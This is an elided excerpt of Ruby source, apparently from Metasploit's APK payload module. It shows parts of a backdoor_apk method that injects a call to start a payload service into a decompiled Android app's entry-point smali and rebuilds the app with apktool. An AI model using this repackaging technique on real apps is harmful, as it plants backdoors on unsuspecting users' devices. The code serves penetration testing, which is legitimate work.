...
class Msf::Payload::Apk
  ...
  def backdoor_apk(apkfile, raw_payload)
    ...
    smalifile = "#{tempdir}/original/smali*/" + hookable_class.tr(".", "/") + ".smali"
    ...
    unless hooksmali
      raise "Unable to find hook point in #{smalifile}\n"
    end
    ...
    payloadhook = %^invoke-static {}, L#{package_slash}/#{classes["MainService"]};->start()V
    ^ + entrypoint
    ...
    unless File.readable?(injected_apk)
      ...
      raise "Unable to rebuild apk with apktool"
    end
